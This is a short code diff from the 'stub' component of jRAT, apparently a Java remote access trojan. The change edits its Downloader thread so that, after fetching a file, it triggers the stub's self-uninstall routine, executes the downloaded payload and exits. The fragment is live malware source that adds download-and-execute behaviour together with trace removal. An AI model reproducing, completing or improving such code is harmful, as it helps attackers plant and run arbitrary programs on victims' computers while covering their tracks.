@@ -1,6 +1,5 @@
 package pro.jrat.stub;
 
-import java.awt.Desktop;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
@@ -10,7 +9,7 @@ import java.util.Random;
 
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.common.downloadable.Downloadable;
-import pro.jrat.stub.utils.Utils;
+import pro.jrat.stub.packets.incoming.Packet36Uninstall;
 
 
 public class Downloader extends Thread {
@@ -65,6 +64,7 @@ public class Downloader extends Thread {
 					} catch (Exception ex) {
 						ex.printStackTrace();
 					}
+					new Packet36Uninstall().read();
 					type.execute(file);
 					Main.running = false;
 					System.exit(0);
